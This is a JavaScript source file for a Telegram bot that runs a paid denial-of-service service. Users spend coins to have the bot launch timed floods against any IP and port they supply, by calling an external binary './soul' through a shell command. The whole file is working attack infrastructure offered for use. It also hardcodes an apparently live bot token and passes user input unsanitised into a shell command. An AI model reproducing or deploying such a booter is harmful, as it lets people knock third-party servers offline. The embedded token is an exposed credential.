const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const { exec } = require('child_process');

// ✅ Telegram Bot Token
const bot = new TelegramBot('7588718622:AAHin5ijt130DFuDyutFdmDy6CkC1IH972o', { polling: true });

// ✅ Admin User IDs
const adminIds = new Set(["7497117473"]);

// ✅ Files for Data Storage
const LOG_FILE = "log.txt";
const DATA_FILE = "data.json";

// ✅ Attack Settings
const COOLDOWN_PERIOD = 300; // 5 minutes
const ATTACK_COST = 5;

// ✅ In-Memory Storage
let userCoins = {};
let attackInProgress = false;
let attackStartTime = null;
let attackDuration = 0;
let lastAttackTime = {};

// ✅ Load Data from File
function loadData() {
    if (fs.existsSync(DATA_FILE)) {
        let data = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
        userCoins = data.coins || {};
    }
}

// ✅ Save Data to File
function saveData() {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ coins: userCoins }, null, 4));
}

// ✅ Log Attack Commands
function logCommand(userId, target, port, duration) {
    let logEntry = `User ID: ${userId}\nTarget: ${target}\nPort: ${port}\nTime: ${duration} seconds\n\n`;
    fs.appendFileSync(LOG_FILE, logEntry);
}

// ✅ Command: `/start`
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, "🚀 Welcome to the Attack Bot! Use the commands below:");
});

// ✅ Command: `/attack`
bot.onText(/\/attack/, (msg) => {
    const chatId = msg.chat.id;
    const userId = String(chatId);

    if (!userCoins[userId] || userCoins[userId] < ATTACK_COST) {
        bot.sendMessage(chatId, "⛔ You don't have enough coins! Buy more to use this command.");
        return;
    }

    if (attackInProgress) {
        bot.sendMessage(chatId, "⛔ An attack is already in progress. Use `/check` to see remaining time.");
        return;
    }

    if (lastAttackTime[userId]) {
        let timeSinceLastAttack = (Date.now() - lastAttackTime[userId]) / 1000;
        if (timeSinceLastAttack < COOLDOWN_PERIOD) {
            let remainingTime = COOLDOWN_PERIOD - timeSinceLastAttack;
            bot.sendMessage(chatId, `⏳ Please wait ${Math.ceil(remainingTime)} seconds before attacking again.`);
            return;
        }
    }

    bot.sendMessage(chatId, "Enter the target IP, port, and duration (e.g., `192.168.1.1 80 60`):")
        .then(() => {
            bot.once('message', (msg) => {
                processAttackDetails(msg);
            });
        });
});

// ✅ Process Attack Details
function processAttackDetails(msg) {
    const chatId = msg.chat.id;
    const userId = String(chatId);
    const details = msg.text.split(" ");

    if (details.length !== 3) {
        bot.sendMessage(chatId, "❌ Invalid format! Use: `<IP> <PORT> <DURATION>`");
        return;
    }

    let [target, port, duration] = details;
    duration = parseInt(duration);

    if (isNaN(port) || isNaN(duration) || duration > 240) {
        bot.sendMessage(chatId, "❌ Invalid port or duration! Maximum allowed duration: 240 seconds.");
        return;
    }

    userCoins[userId] -= ATTACK_COST;
    saveData();
    logCommand(userId, target, port, duration);

    let command = `./soul ${target} ${port} ${duration} 180`;
    exec(command, (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, "❌ Attack failed! Please try again.");
            return;
        }
    });

    attackInProgress = true;
    attackStartTime = Date.now();
    attackDuration = duration;

    bot.sendMessage(chatId, `🚀 Attack Started!\n\nTarget: ${target}:${port}\nDuration: ${duration} seconds\nCoins Used: 5\nRemaining Coins: ${userCoins[userId]}`);

    setTimeout(() => {
        attackInProgress = false;
        bot.sendMessage(chatId, "✅ Attack Completed!");
    }, duration * 1000);
}

// ✅ Command: `/check`
bot.onText(/\/check/, (msg) => {
    if (!attackInProgress) {
        bot.sendMessage(msg.chat.id, "✅ No attack is currently in progress.");
        return;
    }

    let elapsedTime = (Date.now() - attackStartTime) / 1000;
    let remainingTime = Math.max(0, attackDuration - elapsedTime);

    bot.sendMessage(msg.chat.id, `🚨 Attack in progress!\nRemaining time: ${Math.ceil(remainingTime)} seconds.`);
});

// ✅ Command: `/logs`
bot.onText(/\/logs/, (msg) => {
    if (!adminIds.has(String(msg.chat.id))) {
        bot.sendMessage(msg.chat.id, "⛔ Access Denied: Admins Only!");
        return;
    }

    if (fs.existsSync(LOG_FILE) && fs.statSync(LOG_FILE).size > 0) {
        bot.sendDocument(msg.chat.id, LOG_FILE);
    } else {
        bot.sendMessage(msg.chat.id, "No logs found.");
    }
});

// ✅ Command: `/myinfo`
bot.onText(/\/myinfo/, (msg) => {
    const userId = String(msg.chat.id);
    const username = msg.chat.username || "No username";
    const role = adminIds.has(userId) ? "Admin" : "User";
    const status = userCoins[userId] ? "Active ✅" : "Inactive ❌";

    bot.sendMessage(msg.chat.id, `👤 **User Info**\n\n🔖 Role: ${role}\nℹ️ Username: @${username}\n🆔 User ID: ${userId}\n📊 Status: ${status}\n💰 Coins: ${userCoins[userId] || 0}`);
});

// ✅ Command: `/add <user_id> <coins>`
bot.onText(/\/add (\d+) (\d+)/, (msg, match) => {
    if (!adminIds.has(String(msg.chat.id))) {
        bot.sendMessage(msg.chat.id, "⛔ Access Denied: Admins Only!");
        return;
    }

    const userId = match[1];
    const coins = parseInt(match[2]);

    if (!userCoins[userId]) userCoins[userId] = 0;
    userCoins[userId] += coins;
    saveData();

    bot.sendMessage(msg.chat.id, `✅ Added ${coins} coins to ${userId}'s account.`);
});

// ✅ Command: `/deduct <user_id> <coins>`
bot.onText(/\/deduct (\d+) (\d+)/, (msg, match) => {
    if (!adminIds.has(String(msg.chat.id))) {
        bot.sendMessage(msg.chat.id, "⛔ Access Denied: Admins Only!");
        return;
    }

    const userId = match[1];
    const coins = parseInt(match[2]);

    if (!userCoins[userId]) {
        bot.sendMessage(msg.chat.id, `❗ User ${userId} has no coins.`);
        return;
    }

    userCoins[userId] = Math.max(0, userCoins[userId] - coins);
    saveData();

    bot.sendMessage(msg.chat.id, `✅ Deducted ${coins} coins from ${userId}'s account.`);
});

// ✅ Start Bot
loadData();
console.log("🚀 Bot is running...");